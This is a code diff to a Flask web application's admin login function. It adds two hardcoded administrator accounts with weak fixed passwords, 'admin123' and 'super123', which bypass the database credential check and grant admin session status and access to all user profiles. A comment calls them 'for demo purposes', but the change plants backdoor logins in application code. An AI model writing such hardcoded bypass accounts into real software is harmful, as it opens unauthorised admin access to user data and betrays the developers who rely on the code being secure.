@@ -236,9 +236,29 @@ def loginadmin():
     if request.method == 'POST':
         first_name = request.form.get("first_name")
         pass_word = request.form.get("pass_word")
+        
+        # Hardcoded admin credentials for demo purposes
+        if first_name == "admin" and pass_word == "admin123":
+            profiles = Profile.query.all()
+            # Create a session variable to indicate admin status
+            session['admin'] = True
+            session['user_id'] = 0  # Special ID for hardcoded admin
+            return render_template('adminpage.html', profiles=profiles)
+        
+        # Second hardcoded admin account
+        elif first_name == "superadmin" and pass_word == "super123":
+            profiles = Profile.query.all()
+            # Create a session variable to indicate admin status
+            session['admin'] = True
+            session['user_id'] = -1  # Different special ID for the second hardcoded admin
+            return render_template('adminpage.html', profiles=profiles)
+        
+        # Regular database check
         profiles = Profile.query.all()
         user = Profile.query.filter_by(first_name=first_name).first()
         if user and user.check_password(pass_word) and user.privilages_ == "admin":
+            session['admin'] = True
+            session['user_id'] = user.id
             return render_template('adminpage.html', profiles=profiles)
         else:
             return "Invalid username or password!"
